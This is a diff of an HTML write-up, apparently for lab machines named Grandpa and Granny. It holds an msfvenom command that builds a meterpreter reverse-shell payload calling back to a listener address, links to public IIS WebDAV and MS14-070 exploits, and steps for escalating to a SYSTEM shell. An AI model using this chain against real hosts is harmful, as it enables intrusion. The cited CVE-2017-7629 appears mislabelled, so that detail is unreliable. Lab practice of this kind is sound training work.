@@ -115,12 +115,20 @@ download &quot;C:\Documents and settings\administrator\desktop\root.txt&quot;
 
 <h2 id="oscp-way">OSCP way</h2>
 
-<p><a href="https://github.com/danigargu/explodingcan">https://github.com/danigargu/explodingcan</a></p>
+<h3 id="grandpa">Grandpa</h3>
+
+<p>CVE-2017-7629: <a href="https://github.com/danigargu/explodingcan">https://github.com/danigargu/explodingcan</a></p>
 
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.16.80 LPORT=4444 &gt;shellcode
 </code></pre>
 
 <p>Use the script from here to get a meterpreter shell. After that, Migrate the meterpreter to a stabler process. Download MS14-070 exploit from <a href="https://github.com/abatchy17/WindowsExploits">https://github.com/abatchy17/WindowsExploits</a>. You&rsquo;ll have a <code>NT AUTHORITY/SYSTEM</code> shell.</p>
+
+<h3 id="granny">Granny</h3>
+
+<p>No way, totally MSF here.</p>
+
+<p>TBH, I can write one using Python by analyzing the MSF exploit. But I don&rsquo;t think worth it.</p>
 
 <h1 id="writeup">Writeup</h1>
 
